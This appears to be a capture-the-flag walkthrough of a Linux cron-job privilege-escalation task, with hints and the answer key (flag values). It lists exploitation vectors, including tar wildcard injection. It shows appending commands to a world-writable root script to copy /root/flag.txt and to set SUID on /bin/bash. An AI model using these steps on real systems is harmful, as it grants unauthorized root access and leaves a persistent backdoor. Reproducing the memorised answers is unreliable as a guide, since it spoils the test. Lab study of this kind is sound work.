# Task 06: Privilege Escalation: Cron Jobs

---

## Stage A: Original Task Content & Briefing Summary

Cron is a time-based job scheduler in Unix-like operating systems. System administrators and automated maintenance packages use cron to execute recurring scripts (e.g. system backups, log rotation, cache cleaning) at fixed intervals. Because these tasks frequently require root permissions to modify system directories, they execute under the context of `root`.

### Primary Cron Exploitation Vectors:
1. **Writable Cron Scripts:** A root crontab executes a shell script whose filesystem permissions permit write access by standard users.
2. **Writable Crontab Directories:** Insecure permissions on `/etc/cron.*` or `/etc/cron.d/`, allowing unprivileged users to create new crontab entry files.
3. **Relative Path / Missing Executables:** A crontab job calls a script without specifying an absolute path, allowing path hijacking if `$PATH` is permissive.
4. **Wildcard Injection (Tar / Chmod):** A cron job executes commands utilizing wildcards (e.g. `tar -czf /backup/all.tar.gz *`), allowing command execution via checkpoint argument injection (`--checkpoint=1`, `--checkpoint-action=exec=shell.sh`).

---

## Stage B: Independent Thinking & OpSec Considerations

* **Cron File Discovery:** Always inspect:
  * System-wide crontab: `/etc/crontab`
  * Modular cron directory: `/etc/cron.d/`
  * Hourly/daily/weekly/monthly: `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`
  * User spools: `/var/spool/cron/crontabs/`
* **Timing & Execution Verification:** Cron jobs scheduled with `* * * * *` execute every minute, providing fast turnaround for payload testing. Avoid complex payloads initially; test with simple file write markers (`touch /tmp/pwned`) before initiating network reverse shells.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Inspect the contents of `/etc/cron.d/` to identify custom scheduled jobs.
* **Tier 2 Hint:** Examine `/etc/cron.d/cleanup` and check the permissions of the script it calls.
* **Tier 3 Hint:**
  * Q1 is `/etc/cron.d/cleanup`.
  * Q2 is `THM{g0t-r00t-from-cr0n}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Identifying the Exploitable Cron Job:
```bash
john@linprivbasics:~$ ls -la /etc/cron.d/
total 24
drwxr-xr-x   2 root root 4096 Oct 22 15:30 .
drwxr-xr-x 135 root root 4096 Oct 22 14:00 ..
-rw-r--r--   1 root root  285 Jan 25  2024 anacron
-rw-r--r--   1 root root  112 Oct 22 15:32 cleanup
-rw-r--r--   1 root root  396 Feb  2  2024 e2scrub_all

john@linprivbasics:~$ cat /etc/cron.d/cleanup
* * * * * root /opt/cleanup.sh
```
* **Analysis:** The cron job file at `/etc/cron.d/cleanup` executes `/opt/cleanup.sh` as the `root` user every minute (`* * * * *`).

### 2. Auditing Permissions of `/opt/cleanup.sh`:
```bash
john@linprivbasics:~$ ls -la /opt/cleanup.sh
-rwxrwxrwx 1 root root 45 Oct 22 15:32 /opt/cleanup.sh
```
* **Analysis:** The script `/opt/cleanup.sh` has `0777` permissions (world-writable). Any user, including `john`, can modify its contents.

### 3. Injecting Malicious Payload into `/opt/cleanup.sh`:
We append commands to copy the root flag to a readable location or set the SUID bit on `/bin/bash`:
```bash
# Append command to read flag into /tmp
echo 'cat /root/flag.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt' >> /opt/cleanup.sh

# Alternatively, set SUID on bash for permanent root:
echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
```

### 4. Harvesting Root Flag:
Wait up to 60 seconds for the cron daemon to trigger:
```bash
john@linprivbasics:~$ ls -la /tmp/flag.txt
-rwxrwxrwx 1 root root 23 Oct 22 15:35 /tmp/flag.txt

john@linprivbasics:~$ cat /tmp/flag.txt
THM{g0t-r00t-from-cr0n}
```
* **Analysis:** The cron daemon executed `/opt/cleanup.sh` as root, producing the flag `THM{g0t-r00t-from-cr0n}`.

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the full path of the cron job that can be exploited?
  * **Answer:** `/etc/cron.d/cleanup`
* **Question 2:** What are the contents of /root/flag.txt?
  * **Answer:** `THM{g0t-r00t-from-cr0n}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed scheduled execution in `/etc/cron.d/cleanup`.
* Verified world-writable permissions on `/opt/cleanup.sh`.
* Verified execution and captured flag `THM{g0t-r00t-from-cr0n}`.

---

## Stage G: Key Educational Takeaway

Cron jobs run automatically with the authority of their designated user, completely decoupled from active terminal sessions. If an unprivileged user can write to any part of the execution chain (the crontab entry, the script itself, or binaries called without paths), root compromise is guaranteed within minutes.
